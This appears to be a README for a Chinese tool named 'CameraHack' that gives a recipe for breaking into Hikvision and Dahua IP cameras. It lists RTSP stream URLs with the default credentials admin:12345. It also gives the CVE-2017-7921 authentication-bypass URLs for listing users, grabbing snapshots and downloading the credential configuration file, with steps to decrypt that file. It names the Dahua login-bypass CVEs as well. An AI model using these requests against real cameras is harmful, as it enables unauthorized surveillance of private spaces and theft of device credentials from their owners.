# CameraHack
批量扫描破解海康威视、大华等摄像头的常见漏洞、弱密码

## 海康威视

### RTSP 弱密码

```shell
# 主码流
rtsp://admin:12345@IP:554/h264/ch1/main/av_stream
rtsp://admin:12345@IP:554/MPEG-4/ch1/main/av_stream

# 子码流
rtsp://admin:12345@IP/mpeg4/ch1/sub/av_stream
rtsp://admin:12345@IP/h264/ch1/sub/av_stream
```

### CVE-2017-7921 漏洞

1. 检索设备列表
```
http://IP/Security/users?auth=YWRtaW46MTEK
```

2. 获取监控快照
```
http://IP/onvif-http/snapshot?auth=YWRtaW46MTEK
```

3. 下载摄像头配置账号密码文件
```
http://192.168.1.3/System/configurationFile?auth=YWRtaW46MTEK
```
- 浏览器会自动下载一个名为 `configurationFile` 的文件,需要经过解密。  
  Payload: [https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor](https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor)

- 需要一个工具 `wxMEdit` 打开解密后的配置文件,搜索关键字 `admin`.

## 大华摄像头

### 漏洞利用 `CVE-2021-33044` & `CVE-2021-33045` , 绕过 web 登录鉴权

### rtsp 弱密码
```shell
rtsp://admin:12345@IP:554/cam/realmonitor?channel=1&subtype=0
```

